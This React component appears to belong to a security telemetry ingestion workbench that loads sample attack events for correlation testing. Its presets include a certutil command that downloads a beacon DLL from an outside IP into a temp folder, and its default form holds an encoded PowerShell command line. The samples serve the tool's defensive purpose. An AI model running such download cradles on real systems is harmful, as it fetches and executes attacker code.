import React, { useState } from 'react';
import { 
  X, 
  Terminal, 
  Upload, 
  PlusCircle, 
  CheckCircle2, 
  Database,
  Cloud,
  Key,
  Globe,
  Radio,
  FileCode
} from 'lucide-react';
import { api } from '../services/api';

const PRESET_TEMPLATES = [
  {
    name: 'Endpoint: Suspicious Certutil Download Cradle',
    domain: 'endpoint',
    event_type: 'process_creation',
    severity: 'high',
    source_host: 'WKSTN-DEV-12',
    dest_host: 'WKSTN-DEV-12',
    source_ip: '10.0.1.75',
    dest_ip: '185.220.101.5',
    user_id: 'alex.chen',
    process_name: 'certutil.exe',
    command_line: 'certutil.exe -urlcache -split -f http://185.220.101.5/beacon.dll C:\\Windows\\Temp\\beacon.dll',
    parent_process: 'cmd.exe',
    mitre_tactic: 'Command and Control',
    mitre_technique_id: 'T1105',
    mitre_technique_name: 'Ingress Tool Transfer'
  },
  {
    name: 'Auth: Impossible Travel / Multi-IP Spray',
    domain: 'auth',
    event_type: 'vpn_login',
    severity: 'critical',
    source_host: 'Remote Client',
    dest_host: 'VPN-GW-02',
    source_ip: '45.154.255.89',
    dest_ip: '10.0.0.1',
    user_id: 'sarah.connor',
    process_name: null,
    command_line: null,
    parent_process: null,
    mitre_tactic: 'Initial Access',
    mitre_technique_id: 'T1078',
    mitre_technique_name: 'Valid Accounts'
  },
  {
    name: 'Network: High-Entropy DNS Tunneling Query',
    domain: 'network',
    event_type: 'dns_query',
    severity: 'high',
    source_host: 'WKSTN-FIN-04',
    dest_host: 'ns1.c2-telemetry-sync.net',
    source_ip: '10.0.1.44',
    dest_ip: '8.8.8.8',
    user_id: 'sarah.connor',
    process_name: 'powershell.exe',
    command_line: null,
    parent_process: null,
    mitre_tactic: 'Exfiltration',
    mitre_technique_id: 'T1071.004',
    mitre_technique_name: 'DNS Tunneling'
  },
  {
    name: 'Cloud: AWS CloudTrail DeleteSecurityGroupRule',
    domain: 'cloud',
    event_type: 'aws_api_call',
    severity: 'critical',
    source_host: 'AWS Console',
    dest_host: 'AWS VPC (us-east-1)',
    source_ip: '185.220.101.5',
    dest_ip: 'AWS-EC2-Endpoint',
    user_id: 'ProductionDataOpsRole',
    process_name: null,
    command_line: null,
    parent_process: null,
    cloud_service: 'EC2',
    cloud_action: 'AuthorizeSecurityGroupIngress',
    mitre_tactic: 'Defense Evasion',
    mitre_technique_id: 'T1562.007',
    mitre_technique_name: 'Disable or Modify Cloud Firewall'
  }
];

export default function IngestionPanel({ scenarioId, onEventIngested, onClose }) {
  const [formData, setFormData] = useState({
    domain: 'endpoint',
    event_type: 'process_creation',
    severity: 'high',
    source_host: 'WKSTN-FIN-04',
    dest_host: 'DC01.corp.local',
    source_ip: '10.0.1.44',
    dest_ip: '10.0.0.5',
    user_id: 'sarah.connor',
    process_name: 'powershell.exe',
    command_line: 'powershell.exe -Enc JABjAGwAaQBlAG4AdAAg...',
    parent_process: 'explorer.exe',
    cloud_service: '',
    cloud_action: '',
    mitre_tactic: 'Execution',
    mitre_technique_id: 'T1059.001',
    mitre_technique_name: 'PowerShell Execution'
  });

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [successMessage, setSuccessMessage] = useState(null);

  const handleApplyPreset = (preset) => {
    setFormData({
      ...formData,
      ...preset
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);
    setSuccessMessage(null);

    try {
      const payload = {
        ...formData,
        scenario_id: scenarioId,
        timestamp: new Date().toISOString().replace('T', ' ').substring(0, 19),
        raw_payload: {
          submitted_via: 'AegisHunt Ingestion Workbench',
          ingested_at: new Date().toISOString()
        }
      };

      const result = await api.ingestEvent(payload);
      setSuccessMessage(`Event successfully ingested and correlated: ${result.event_uuid}`);
      if (onEventIngested) onEventIngested();
    } catch (err) {
      console.error('Ingestion error:', err);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/75 backdrop-blur-sm p-4 overflow-y-auto animate-fadeIn">
      <div className="bg-[#0F172A] border border-slate-700 w-full max-w-2xl rounded-2xl shadow-2xl flex flex-col overflow-hidden">
        
        {/* Header */}
        <div className="p-4 sm:p-5 border-b border-slate-800 flex items-center justify-between bg-slate-900/90">
          <div className="flex items-center gap-2.5">
            <div className="p-2 rounded-lg bg-cyan-600/20 text-cyan-400 border border-cyan-500/30">
              <Upload className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-sm font-bold text-white flex items-center gap-2">
                Multi-Source Security Telemetry Ingestion Workbench
              </h2>
              <p className="text-xs text-slate-400">
                Ingest live Endpoint (EDR), Identity/Auth, Network, or Cloud logs into the correlation pipeline.
              </p>
            </div>
          </div>

          <button
            onClick={onClose}
            className="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 transition"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Content */}
        <div className="p-5 sm:p-6 space-y-4 max-h-[75vh] overflow-y-auto text-xs text-slate-300">
          
          {/* Quick Presets */}
          <div className="space-y-1.5">
            <label className="text-[11px] font-mono text-slate-400 uppercase font-semibold">
              Load Attack Telemetry Preset
            </label>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
              {PRESET_TEMPLATES.map((p, idx) => (
                <button
                  key={idx}
                  type="button"
                  onClick={() => handleApplyPreset(p)}
                  className="p-2 text-left rounded-lg bg-slate-950 border border-slate-800 hover:border-cyan-500/50 hover:bg-slate-900 transition flex items-center justify-between text-xs"
                >
                  <span className="truncate pr-1 text-slate-200">{p.name}</span>
                  <span className="text-[10px] font-mono uppercase text-cyan-400 font-bold">
                    {p.domain}
                  </span>
                </button>
              ))}
            </div>
          </div>

          {/* Ingestion Form */}
          <form onSubmit={handleSubmit} className="space-y-3 pt-2 border-t border-slate-800">
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              <div>
                <label className="block text-[10px] font-mono text-slate-400 uppercase mb-1">Domain</label>
                <select
                  value={formData.domain}
                  onChange={(e) => setFormData({ ...formData, domain: e.target.value })}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
                >
                  <option value="endpoint">Endpoint (EDR)</option>
                  <option value="auth">Identity / Auth</option>
                  <option value="network">Network (Zeek/Netflow)</option>
                  <option value="cloud">Cloud (AWS/Azure)</option>
                </select>
              </div>

              <div>
                <label className="block text-[10px] font-mono text-slate-400 uppercase mb-1">Event Type</label>
                <input
                  type="text"
                  value={formData.event_type}
                  onChange={(e) => setFormData({ ...formData, event_type: e.target.value })}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
                />
              </div>

              <div>
                <label className="block text-[10px] font-mono text-slate-400 uppercase mb-1">Severity</label>
                <select
                  value={formData.severity}
                  onChange={(e) => setFormData({ ...formData, severity: e.target.value })}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
                >
                  <option value="informational">Informational</option>
                  <option value="low">Low</option>
                  <option value="medium">Medium</option>
                  <option value="high">High</option>
                  <option value="critical">Critical</option>
                </select>
              </div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div>
                <label className="block text-[10px] font-mono text-slate-400 uppercase mb-1">Source Host</label>
                <input
                  type="text"
                  value={formData.source_host}
                  onChange={(e) => setFormData({ ...formData, source_host: e.target.value })}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs text-slate-200"
                />
              </div>
              <div>
                <label className="block text-[10px] font-mono text-slate-400 uppercase mb-1">Dest Host</label>
                <input
                  type="text"
                  value={formData.dest_host}
                  onChange={(e) => setFormData({ ...formData, dest_host: e.target.value })}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs text-slate-200"
                />
              </div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              <div>
                <label className="block text-[10px] font-mono text-slate-400 uppercase mb-1">Source IP</label>
                <input
                  type="text"
                  value={formData.source_ip}
                  onChange={(e) => setFormData({ ...formData, source_ip: e.target.value })}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs text-slate-200"
                />
              </div>
              <div>
                <label className="block text-[10px] font-mono text-slate-400 uppercase mb-1">Dest IP</label>
                <input
                  type="text"
                  value={formData.dest_ip}
                  onChange={(e) => setFormData({ ...formData, dest_ip: e.target.value })}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs text-slate-200"
                />
              </div>
              <div>
                <label className="block text-[10px] font-mono text-slate-400 uppercase mb-1">User Identity</label>
                <input
                  type="text"
                  value={formData.user_id}
                  onChange={(e) => setFormData({ ...formData, user_id: e.target.value })}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs text-slate-200"
                />
              </div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div>
                <label className="block text-[10px] font-mono text-slate-400 uppercase mb-1">MITRE Technique ID</label>
                <input
                  type="text"
                  value={formData.mitre_technique_id}
                  onChange={(e) => setFormData({ ...formData, mitre_technique_id: e.target.value })}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs text-slate-200 font-mono"
                />
              </div>
              <div>
                <label className="block text-[10px] font-mono text-slate-400 uppercase mb-1">MITRE Tactic</label>
                <input
                  type="text"
                  value={formData.mitre_tactic}
                  onChange={(e) => setFormData({ ...formData, mitre_tactic: e.target.value })}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs text-slate-200"
                />
              </div>
            </div>

            <div>
              <label className="block text-[10px] font-mono text-slate-400 uppercase mb-1">Command Line / Action Detail</label>
              <textarea
                rows={2}
                value={formData.command_line}
                onChange={(e) => setFormData({ ...formData, command_line: e.target.value })}
                className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2 text-xs font-mono text-amber-200 focus:outline-none focus:border-cyan-500"
              />
            </div>

            {successMessage && (
              <div className="p-3 rounded-lg bg-emerald-950/60 border border-emerald-500/50 text-emerald-300 text-xs flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                <span>{successMessage}</span>
              </div>
            )}

            <div className="pt-2 flex items-center justify-end gap-2">
              <button
                type="button"
                onClick={onClose}
                className="px-4 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 font-medium text-xs transition"
              >
                Close
              </button>
              <button
                type="submit"
                disabled={isSubmitting}
                className="px-4 py-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white font-semibold text-xs shadow-lg shadow-cyan-600/30 transition flex items-center gap-1.5"
              >
                {isSubmitting ? (
                  <span>Ingesting...</span>
                ) : (
                  <>
                    <PlusCircle className="w-4 h-4" />
                    <span>Ingest Event Now</span>
                  </>
                )}
              </button>
            </div>
          </form>

        </div>
      </div>
    </div>
  );
}
